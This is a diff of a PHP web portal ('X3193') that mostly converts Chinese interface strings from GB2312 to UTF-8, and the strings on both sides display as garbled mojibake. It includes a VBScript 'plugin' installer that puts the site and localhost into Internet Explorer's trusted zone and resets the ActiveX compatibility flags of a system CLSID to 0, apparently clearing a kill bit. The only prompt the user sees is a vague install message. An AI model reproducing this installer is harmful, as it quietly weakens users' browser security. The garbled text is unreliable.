@@ -9261,14 +10889,14 @@ function tts_<?php echo $i; ?>()
                                       	}
                                       	else{
                                       		?>
-                                      		<a style='<?php if($searchresult[$i]['nodeotext']==""||(!$voiceresult[$langstr])){ ?>display:none<?php } ?>' href="<?php echo httppath();?>?api=bing&action=tts&content=<?php echo encodeuri($searchresult[$i]['nodeotext']);?>&download=1" target=_blank>ÓïÒô</a>
+                                      		<a style='<?php if($searchresult[$i]['nodeotext']==""||(!$voiceresult[$langstr])){ ?>display:none<?php } ?>' href="<?php echo httppath();?>?api=bing&action=tts&content=<?php echo encodeuri($searchresult[$i]['nodeotext']);?>&download=1" target=_blank>è¯­éŸ³</a>
                                       		<?php
                                       	
                                       	}
                                         ?>  
-                                               <a style='' href="http://api.webthumbnail.org/?width=1024&height=800&screen=1280&format=png&url=<?php echo encodeuri($nodelink);?>" target=_blank><?php  echo formatchar("ËõÂÔ");?></a> 
-                                               <a style='' href="#" onclick="javascript:window.external.AddFavorite('<?php  echo $nodelink; ?>','<?php  echo $nodetitle; ?>')" target=_self><?php  echo formatchar("ÊÕ²Ø");?></a> 
-                                               <a style='' href="http://api.addthis.com/oexchange/0.8/offer?url=<?php echo encodeuri($nodelink);?>&title=<?php  echo encodeuri(iconv('gb2312','utf-8',$nodetitle));?>&description=<?php  echo encodeuri(iconv('gb2312','utf-8',$nodedescript))?>&pubid=x3193" target=_blank><?php echo formatchar("ÍøÊÕ");?></a>
+                                               <a style='' href="http://api.webthumbnail.org/?width=1024&height=800&screen=1280&format=png&url=<?php echo encodeuri($nodelink);?>" target=_blank><?php  echo ("ç¼©ç•¥");?></a> 
+                                               <a style='' href="#" onclick="javascript:window.external.AddFavorite('<?php  echo $nodelink; ?>','<?php  echo $nodetitle; ?>')" target=_self><?php  echo ("æ”¶è—");?></a> 
+                                               <a style='' href="http://api.addthis.com/oexchange/0.8/offer?url=<?php echo encodeuri($nodelink);?>&title=<?php  echo encodeuri(iconv('gb2312','utf-8',$nodetitle));?>&description=<?php  echo encodeuri(iconv('gb2312','utf-8',$nodedescript))?>&pubid=x3193" target=_blank><?php echo ("ç½‘æ”¶");?></a>
                                         </td>   
                                 </tr>
                         </table>                        
@@ -9283,15 +10911,15 @@ function tts_<?php echo $i; ?>()
 
                         
                         ?>
-                <td align="center" colspan="3" style="<?php $style->selcolor($skincolor,'tdtbg');?>"> ¹² <?php echo $totalpage;?> Ò³ µÚ  
+                <td align="center" colspan="3" style="<?php $style->selcolor($skincolor,'tdtbg');?>"> å…± <?php echo $totalpage;?> é¡µ ç¬¬  
                         <?php 
-                        echo $page." Ò³".$sCrlf.' ';
-                        echo "<a style='' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&page=1&skin=".$skincolor."&tolang=".encodeuri(trim(request('tolang')))."&market=".encodeuri(trim(request('market')))."'>Ê×Ò³</a> ";
+                        echo $page." é¡µ".$sCrlf.' ';
+                        echo "<a style='' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&page=1&skin=".$skincolor."&tolang=".encodeuri(trim(request('tolang')))."&market=".encodeuri(trim(request('market')))."'>é¦–é¡µ</a> ";
                         if (floor($page) > 1)
-                                echo "<a style='' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&page=".encodeuri(($page-1))."&skin=".$skincolor."&tolang=".encodeuri(trim(request('tolang')))."&market=".encodeuri(trim(request('market')))."'>ÉÏÒ»Ò³</a> ";
+                                echo "<a style='' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&page=".encodeuri(($page-1))."&skin=".$skincolor."&tolang=".encodeuri(trim(request('tolang')))."&market=".encodeuri(trim(request('market')))."'>ä¸Šä¸€é¡µ</a> ";
                         if (floor($page) > 0 && floor($page) < floor($totalpage))
-                                echo "<a style='' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&page=".encodeuri(($page+1))."&skin=".$skincolor."&tolang=".encodeuri(trim(request('tolang')))."&market=".encodeuri(trim(request('market')))."'>ÏÂÒ»Ò³</a> ";
-        								echo "<a style='' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&page=20&skin=".$skincolor."&tolang=".encodeuri(trim(request('tolang')))."&market=".encodeuri(trim(request('market')))."'>Ä©Ò³</a> ";
+                                echo "<a style='' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&page=".encodeuri(($page+1))."&skin=".$skincolor."&tolang=".encodeuri(trim(request('tolang')))."&market=".encodeuri(trim(request('market')))."'>ä¸‹ä¸€é¡µ</a> ";
+        								echo "<a style='' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&page=20&skin=".$skincolor."&tolang=".encodeuri(trim(request('tolang')))."&market=".encodeuri(trim(request('market')))."'>æœ«é¡µ</a> ";
                 				?>
                 				<input class='input' border="0" name="page" id="page" value="<?php  echo $page; ?>" style="height:20px;width:40px;font-size:11px;text-align:center;" <?php  $style->input("#f9f9f9",""); ?> >
 												<input type="submit" style="<?php $style->selcolor($skincolor,'tdtbg');?>" class="button" name="gotopage" value=" Go ">                 
@@ -9303,7 +10931,7 @@ function tts_<?php echo $i; ?>()
         </tr>   
 </table>                        
                 <?php 
-                //$gotopage->gotopage($totalpage,"?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."&gopage=ok&page=","ÇëÊäÈëÒª×ªµ½µÄÒ³Êı","ÇëÔÚ¿Õ°×´¦ÊäÈëÒª×ªµ½µÄÒ³Êı");
+                //$gotopage->gotopage($totalpage,"?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."&gopage=ok&page=","è¯·è¾“å…¥è¦è½¬åˆ°çš„é¡µæ•°","è¯·åœ¨ç©ºç™½å¤„è¾“å…¥è¦è½¬åˆ°çš„é¡µæ•°");
                 } // video if end
                 elseif (strpos($Sources,"MobileWeb") !== false){ // MobileWeb if start
                         if (0){
@@ -9326,17 +10954,17 @@ function tts_<?php echo $i; ?>()
                         $objXml = new DOMDocument();  
                         $objXml->preserveWhiteSpace = true;
                         $objXml->async = false; 
-                        // ¼ÓXml ÎÄ¼ş    
+                        // åŠ Xml æ–‡ä»¶    
                         $objXml->loadXML($xmlstr);
                         if ($objXml->getElementsByTagName("SearchTerms")->item(0)->nodeValue === false){
                         ?>      
 <table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr class="tdtbg">
-                <td align="center"> ËÑ Ë÷ ½á ¹û </td>
+                <td align="center"> æœ ç´¢ ç»“ æœ </td>
         </tr>
         <tr class="tdbg">
                 <td align="center" id="result">
-                ËÑË÷·¢ÉúÒâÍâ´íÎó£¬ÇëÖØÊÔ£¡
+                æœç´¢å‘ç”Ÿæ„å¤–é”™è¯¯ï¼Œè¯·é‡è¯•ï¼
                 </td>
         </tr>   
 </table>                
@@ -9347,11 +10975,11 @@ function tts_<?php echo $i; ?>()
                         ?>
 <table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr class="tdtbg">
-                <td align="center"> ËÑ Ë÷ ½á ¹û </td>
+                <td align="center"> æœ ç´¢ ç»“ æœ </td>
         </tr>
         <tr class="tdbg">
                 <td align="center" id="result">
-                Î´ËÑË÷µ½ÈÎºÎÊı¾İ£¬ÇëÓÅ»¯¼ìË÷´Ê¡£
+                æœªæœç´¢åˆ°ä»»ä½•æ•°æ®ï¼Œè¯·ä¼˜åŒ–æ£€ç´¢è¯ã€‚
                 </td>
         </tr>   
 </table>                        
@@ -9365,7 +10993,7 @@ function tts_<?php echo $i; ?>()
                         ?>
 <table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr class="tdtbg">
-                <td align="center" colspan="3"> ËÑ Ë÷ ½á ¹û : ¹² <?php  echo $objXml->getElementsByTagName(arrmember(split("[:]","mw:Total"),"1"))->item(0)->nodeValue;?> Ìõ,½öÏÔÊ¾Ç° 1000 Ìõ </td>
+                <td align="center" colspan="3"> æœ ç´¢ ç»“ æœ : å…± <?php  echo $objXml->getElementsByTagName(arrmember(split("[:]","mw:Total"),"1"))->item(0)->nodeValue;?> æ¡,ä»…æ˜¾ç¤ºå‰ 1000 æ¡ </td>
         </tr>   
                         <?php                       
                         for($i=0; $i < $strpagesize;$i++){
@@ -9385,7 +11013,7 @@ function tts_<?php echo $i; ?>()
                         <table width="95%">
                                 <tr>
                                         <td align="center">
-                                                <a style='' href="#" onclick="javascript:window.external.AddFavorite('<?php  echo $nodelink; ?>','<?php  echo $nodetitle; ?>')" target=_self>ÊÕ²Ø</a> <a style='' href="http://api.addthis.com/oexchange/0.8/offer?url=<?php echo encodeuri($nodelink);?>&title=<?php  echo encodeuri(iconv('gb2312','utf-8',$nodetitle));?>&description=<?php  echo encodeuri(iconv('gb2312','utf-8',$nodedescript))?>&pubid=x3193" target=_blank>ÍøÊÕ</a>
+                                                <a style='' href="#" onclick="javascript:window.external.AddFavorite('<?php  echo $nodelink; ?>','<?php  echo $nodetitle; ?>')" target=_self>æ”¶è—</a> <a style='' href="http://api.addthis.com/oexchange/0.8/offer?url=<?php echo encodeuri($nodelink);?>&title=<?php  echo encodeuri(iconv('gb2312','utf-8',$nodetitle));?>&description=<?php  echo encodeuri(iconv('gb2312','utf-8',$nodedescript))?>&pubid=x3193" target=_blank>ç½‘æ”¶</a>
                                         </td>   
                                 </tr>
                         </table>                                
@@ -9410,13 +11038,13 @@ function tts_<?php echo $i; ?>()
                         }       
 
                         ?>
-                <td align="center" colspan="3"> ¹² <?php echo $totalpage;?> Ò³ µÚ  
+                <td align="center" colspan="3"> å…± <?php echo $totalpage;?> é¡µ ç¬¬  
                 -*      <?php 
-                        echo $page." Ò³".$sCrlf.' ';
+                        echo $page." é¡µ".$sCrlf.' ';
                         if (floor($page) > 1)
-                                echo "<a style='' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&page=".encodeuri(($page-1))."&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."'>ÉÏÒ»Ò³</a> ";
+                                echo "<a style='' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&page=".encodeuri(($page-1))."&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."'>ä¸Šä¸€é¡µ</a> ";
                         if (floor($page) > 0 && floor($page) < floor($totalpage))
-                                echo "<a style='' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&page=".encodeuri(($page+1))."&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."'>ÏÂÒ»Ò³</a> ";
+                                echo "<a style='' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&page=".encodeuri(($page+1))."&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."'>ä¸‹ä¸€é¡µ</a> ";
         
                         $gotopage->CallPageChange();
                         
@@ -9425,11 +11053,11 @@ function tts_<?php echo $i; ?>()
         </tr>   
 </table>                        
                 <?php 
-                $gotopage->gotopage($totalpage,"?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."&gopage=ok&page=","ÇëÊäÈëÒª×ªµ½µÄÒ³Êı","ÇëÔÚ¿Õ°×´¦ÊäÈëÒª×ªµ½µÄÒ³Êı");
+                $gotopage->gotopage($totalpage,"?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."&gopage=ok&page=","è¯·è¾“å…¥è¦è½¬åˆ°çš„é¡µæ•°","è¯·åœ¨ç©ºç™½å¤„è¾“å…¥è¦è½¬åˆ°çš„é¡µæ•°");
                 } // MobileWeb if end
                 elseif (strpos($Sources,"Translation") !== false){ // translate if start
                         $targetlang = "Ar|zh-CHS|zh-CHT|Nl|En|Fr|De|It|Ja|Ko|Pl|Pt|Ru|Es"; 
-                        $lang = "Arabic|¼òÌåÖĞÎÄ|·±ówÖĞÎÄ|Dutch|English|French|German|Italian|Japanese|Korean|Polish|Portuguese|Russian|Spanish"; 
+                        $lang = "Arabic|ç®€ä½“ä¸­æ–‡|ç¹é«”ä¸­æ–‡|Dutch|English|French|German|Italian|Japanese|Korean|Polish|Portuguese|Russian|Spanish"; 
                         $langstr = split("[|]",$lang);
                         $langcharset = "";
                         $strResult = "";
@@ -9440,7 +11068,7 @@ function tts_<?php echo $i; ?>()
                                 $objXml->preserveWhiteSpace = true;
                                 $objXml->async = false; 
                                 if (0){
-                                        $xmlstr = '<?php xml version="1.0" encoding="GBK" ?><?php pageview_candidate?><SearchResponse xmlns="http://schemas.microsoft.com/LiveSearch/2008/04/XML/element" Version="2.2"><Query><SearchTerms>espero</SearchTerms></Query><tra:Translation xmlns:tra="http://schemas.microsoft.com/LiveSearch/2008/04/XML/translation"><tra:Results><tra:TranslationResult><tra:TranslatedTerm>µ«Ô¸</tra:TranslatedTerm></tra:TranslationResult></tra:Results></tra:Translation></SearchResponse>';
+                                        $xmlstr = '<?php xml version="1.0" encoding="GBK" ?><?php pageview_candidate?><SearchResponse xmlns="http://schemas.microsoft.com/LiveSearch/2008/04/XML/element" Version="2.2"><Query><SearchTerms>espero</SearchTerms></Query><tra:Translation xmlns:tra="http://schemas.microsoft.com/LiveSearch/2008/04/XML/translation"><tra:Results><tra:TranslationResult><tra:TranslatedTerm>ä½†æ„¿</tra:TranslatedTerm></tra:TranslationResult></tra:Results></tra:Translation></SearchResponse>';
                                 }       
                                 else{   
                                         $url = "https://api.datamarket.azure.com/Bing/Search/xml.aspx?AppId=".encodeuri($BingAppId)."&Market=".encodeuri(trim(request("market")))."&Query=".encodeuri(iconv('gb2312','utf-8',$query))."&Sources=".encodeuri($soSources)."&Version=".encodeuri("2.2")."&Options=EnableHighlighting&Translation.SourceLanguage=".trim(request("transfrom"))."&Translation.TargetLanguage=".arrmember(split("[|]",$targetlang),($targetlangi));
@@ -9459,7 +11087,7 @@ function tts_<?php echo $i; ?>()
                                 $objXml = new DOMDocument();  
                                 $objXml->preserveWhiteSpace = true;
                                 $objXml->async = false; 
-                                // ¼ÓXml ÎÄ¼ş    
+                                // åŠ Xml æ–‡ä»¶    
                                 $objXml->loadXML($xmlstr);
 
                                 if ($objXml->getElementsByTagName("SearchTerms")->item(0)->nodeValue && $objXml->getElementsByTagName(arrmember(split("[:]","tra:TranslationResult"),"1"))->item(0)->nodeValue===null){
@@ -9471,9 +11099,9 @@ function tts_<?php echo $i; ?>()
                                         $nodeTerm = $objHdd->getElementsByTagName(arrmember(split("[:]","tra:TranslatedTerm"),"1"))->item(0)->nodeValue." ";
 
                                         if ($targetlangi == "0")
-                                                $strResult = GetGB2312String($nodeTerm);
+                                                $strResult = ($nodeTerm);
                                         else
-                                                $strResult = $strResult."|".GetGB2312String($nodeTerm);
+                                                $strResult = $strResult."|".($nodeTerm);
                                 }                               
                         }       
                 
@@ -9481,11 +11109,11 @@ function tts_<?php echo $i; ?>()
                         ?>      
 <table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr class="tdtbg">
-                <td align="center">ËÑ Ë÷ ½á ¹û</td>
+                <td align="center">æœ ç´¢ ç»“ æœ</td>
         </tr>
         <tr class="tdbg">
                 <td align="center" id="result">
-                ËÑË÷·¢ÉúÒâÍâ´íÎó£¬ÇëÖØÊÔ£¡
+                æœç´¢å‘ç”Ÿæ„å¤–é”™è¯¯ï¼Œè¯·é‡è¯•ï¼
                 </td>
         </tr>   
 </table>
@@ -9496,11 +11124,11 @@ function tts_<?php echo $i; ?>()
                         ?>      
 <table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr class="tdtbg">
-                <td align="center">ËÑ Ë÷ ½á ¹û</td>
+                <td align="center">æœ ç´¢ ç»“ æœ</td>
         </tr>
         <tr class="tdbg">
                 <td align="center" id="result">
-                ËÑË÷Î´·¢ÏÖÈÎºÎĞÅÏ¢£¡
+                æœç´¢æœªå‘ç°ä»»ä½•ä¿¡æ¯ï¼
                 </td>
         </tr>   
 </table>
@@ -9510,7 +11138,7 @@ function tts_<?php echo $i; ?>()
                         ?>
 <table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr class="tdtbg">
-                <td align="center" colspan="3">ËÑ Ë÷ ½á ¹û : ¹² <?php  echo count(split("[|]",$strResult));?> Ìõ </td>
+                <td align="center" colspan="3">æœ ç´¢ ç»“ æœ : å…± <?php  echo count(split("[|]",$strResult));?> æ¡ </td>
         </tr>   
                         <?php 
                         $transstr = split("[|]",$strResult);                                            
@@ -9539,13 +11167,13 @@ function tts_<?php echo $i; ?>()
                         }       
 
                         ?>
-                <td align="center" colspan="3"> ¹² <?php echo $totalpage;?> Ò³ µÚ  
+                <td align="center" colspan="3"> å…± <?php echo $totalpage;?> é¡µ ç¬¬  
                         <?php 
-                        echo $page." Ò³".$sCrlf.' ';
+                        echo $page." é¡µ".$sCrlf.' ';
                         if (floor($page) > 1)
-                                echo "<a style='' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&page=".encodeuri(($page-1))."&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."'>ÉÏÒ»Ò³</a> ";
+                                echo "<a style='' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&page=".encodeuri(($page-1))."&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."'>ä¸Šä¸€é¡µ</a> ";
                         if (floor($page) > 0 && floor($page) < floor($totalpage))
-                                echo "<a style='' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&page=".encodeuri(($page+1))."&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."'>ÏÂÒ»Ò³</a> ";
+                                echo "<a style='' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&page=".encodeuri(($page+1))."&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."'>ä¸‹ä¸€é¡µ</a> ";
         
                         $gotopage->CallPageChange();
                         
@@ -9554,7 +11182,7 @@ function tts_<?php echo $i; ?>()
         </tr>   
 </table>                        
                 <?php 
-                $gotopage->gotopage($totalpage,"?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."&gopage=ok&page=","ÇëÊäÈëÒª×ªµ½µÄÒ³Êı","ÇëÔÚ¿Õ°×´¦ÊäÈëÒª×ªµ½µÄÒ³Êı");
+                $gotopage->gotopage($totalpage,"?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."&gopage=ok&page=","è¯·è¾“å…¥è¦è½¬åˆ°çš„é¡µæ•°","è¯·åœ¨ç©ºç™½å¤„è¾“å…¥è¦è½¬åˆ°çš„é¡µæ•°");
                 } // translate if end
                 
                 } // qurey if end       
@@ -9672,8 +11300,8 @@ Set WshShell = CreateObject("WScript.Shell")
         <?php 
         }
         ?>
-        msgbox "ÕıÔÚ°²×° X3193 Ö÷²å¼ş£¡"
-        setupok = MsgBox("ÊÇ·ñ°²×° X3193 Ö÷²å¼ş£¡", vbOKCancel, "X3193 - Ö÷²å¼ş°²×°")
+        msgbox "æ­£åœ¨å®‰è£… X3193 ä¸»æ’ä»¶ï¼"
+        setupok = MsgBox("æ˜¯å¦å®‰è£… X3193 ä¸»æ’ä»¶ï¼", vbOKCancel, "X3193 - ä¸»æ’ä»¶å®‰è£…")
         If setupok = vbOK Or setupok = vbYes Then
                 WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\<?php echo $zone;?>\",""   
                 WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\<?php echo $zone;?>\http","2","REG_DWORD"
@@ -9681,15 +11309,15 @@ Set WshShell = CreateObject("WScript.Shell")
                 WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\<?php echo $zone;?>\<?php echo $subzone;?>\http","2","REG_DWORD"
                 WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\localhost\",""
                 WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\localhost\http","2","REG_DWORD"
-                WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\MenuExt\X3193 - ËÑË÷²å¼ş\", "<?php echo httppathdir()?>?api=bing&action=getinfo"
-                'WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\MenuExt\X3193 - ÏûÏ¢²å¼ş\", "<?php echo httppathdir()?>?api=imified&action=getinfo"
-                WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\MenuExt\X3193 - Ïà²á²å¼ş\", "<?php echo httppathdir()?>?api=picasa&action=<?php echo encodeuri('photo.getinfo');?>"
-                WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\MenuExt\X3193 - ÍøÖ·²å¼ş\", "<?php echo httppathdir()?>?api=picasa&action=<?php echo encodeuri('urlshortener.getinfo');?>"
+                WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\MenuExt\X3193 - æœç´¢æ’ä»¶\", "<?php echo httppathdir()?>?api=bing&action=getinfo"
+                'WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\MenuExt\X3193 - æ¶ˆæ¯æ’ä»¶\", "<?php echo httppathdir()?>?api=imified&action=getinfo"
+                WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\MenuExt\X3193 - ç›¸å†Œæ’ä»¶\", "<?php echo httppathdir()?>?api=picasa&action=<?php echo encodeuri('photo.getinfo');?>"
+                WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\MenuExt\X3193 - ç½‘å€æ’ä»¶\", "<?php echo httppathdir()?>?api=picasa&action=<?php echo encodeuri('urlshortener.getinfo');?>"
                 WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\ActiveX Compatibility\{00000566-0000-0010-8000-00AA006D2EA4}\Compatibility Flags",""
                 WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\ActiveX Compatibility\{00000566-0000-0010-8000-00AA006D2EA4}\Compatibility Flags","0","REG_DWORD"
-                msgbox "X3193 Ö÷²å¼ş°²×°³É¹¦£¡"
+                msgbox "X3193 ä¸»æ’ä»¶å®‰è£…æˆåŠŸï¼"
         Else
-                msgbox "X3193 Ö÷²å¼ş°²×°²Ù×÷È¡Ïû£¡"
+                msgbox "X3193 ä¸»æ’ä»¶å®‰è£…æ“ä½œå–æ¶ˆï¼"
         End If
         <?php 
         if ($subzone == ""){
@@ -9703,8 +11331,8 @@ Set WshShell = CreateObject("WScript.Shell")
         <?php 
         }
         ?>
-        msgbox("ÕıÔÚÒÆ³ı X3193 Ö÷²å¼ş£¡")
-        setupok = MsgBox("ÊÇ·ñÒÆ³ı X3193 Ö÷²å¼ş£¡", vbOKCancel, "X3193 - Ö÷²å¼şÒÆ³ı")
+        msgbox("æ­£åœ¨ç§»é™¤ X3193 ä¸»æ’ä»¶ï¼")
+        setupok = MsgBox("æ˜¯å¦ç§»é™¤ X3193 ä¸»æ’ä»¶ï¼", vbOKCancel, "X3193 - ä¸»æ’ä»¶ç§»é™¤")
         If setupok = vbOK Or setupok = vbYes Then
                 WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\<?php echo $zone;?>\",""
                 WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\<?php echo $zone;?>\http","0","REG_DWORD"
@@ -9712,17 +11340,17 @@ Set WshShell = CreateObject("WScript.Shell")
                 WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\<?php echo $zone;?>\<?php echo $subzone;?>\http","0","REG_DWORD"
                 WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\localhost\",""
                 WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\localhost\http","0","REG_DWORD"
-                WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\MenuExt\X3193 - ËÑË÷²å¼ş\", ""
-                WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\MenuExt\X3193 - ÏûÏ¢²å¼ş\", ""
-                WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\MenuExt\X3193 - Ïà²á²å¼ş\", ""
-                WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\MenuExt\X3193 - ÍøÖ·²å¼ş\", ""
+                WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\MenuExt\X3193 - æœç´¢æ’ä»¶\", ""
+                WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\MenuExt\X3193 - æ¶ˆæ¯æ’ä»¶\", ""
+                WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\MenuExt\X3193 - ç›¸å†Œæ’ä»¶\", ""
+                WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\MenuExt\X3193 - ç½‘å€æ’ä»¶\", ""
                 WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\ActiveX Compatibility\{00000566-0000-0010-8000-00AA006D2EA4}\Compatibility Flags","1024","REG_DWORD"
-                msgbox "X3193 Ö÷²å¼şÒÆ³ı³É¹¦£¡"
+                msgbox "X3193 ä¸»æ’ä»¶ç§»é™¤æˆåŠŸï¼"
         Else
-                msgbox "X3193 Ö÷²å¼şÒÆ³ı²Ù×÷È¡Ïû£¡"
+                msgbox "X3193 ä¸»æ’ä»¶ç§»é™¤æ“ä½œå–æ¶ˆï¼"
         End If
 elseif WshShell = false then
-        msgbox "X3193 Ö÷²å¼şÒòÏµÍ³¹ÊÕÏ°²×°Ê§°Ü£¡"
+        msgbox "X3193 ä¸»æ’ä»¶å› ç³»ç»Ÿæ•…éšœå®‰è£…å¤±è´¥ï¼"
 end if
         <?php 
         //</script>
@@ -9740,15 +11368,15 @@ function safe360(){
 
 <?php 
 function dnspod(){ // dnspod function start
-header('Content-Type: text/html; charset=gb2312');
+header('Content-Type: text/html; charset=utf-8');
 ?>
 <head>
 <?php 
 $style = new css();
 $style->ico();
-$style->title("X3193 - ÓòÃû");
+$style->title("X3193 - åŸŸå");
 $skincolor = selstyle(trim(request("skin")));
-$sCrLf = chr(13) . chr(10); // »Ø³µ + »»ĞĞ
+$sCrLf = chr(13) . chr(10); // å›è½¦ + æ¢è¡Œ
 ?>
 
 <table width="100%" height="100%" align="center" valign="center">
@@ -9762,9 +11390,9 @@ $sCrLf = chr(13) . chr(10); // »Ø³µ + »»ĞĞ
                 <td align="right" style="border:0">            
                         <?php  
                         	 IF(!is_wap())
-                        	sellink("Ö÷Ò³|²å¼ş|ËÑË÷|ÓòÃû|FTP|¶ÁÊé|ÓÎÏ·|¶ÌÆ¬|¹ÉÆ±|VPN",$skincolor);
+                        	sellink("ä¸»é¡µ|æ’ä»¶|æœç´¢|åŸŸå|FTP|è¯»ä¹¦|æ¸¸æˆ|çŸ­ç‰‡|è‚¡ç¥¨|VPN",$skincolor);
                         else
-                        	sellink("Ö÷Ò³|ËÑË÷|ÓòÃû|FTP|¶ÌÆ¬",$skincolor);
+                        	sellink("ä¸»é¡µ|æœç´¢|åŸŸå|FTP|çŸ­ç‰‡",$skincolor);
                         ?>
                 </td>
         </tr>           
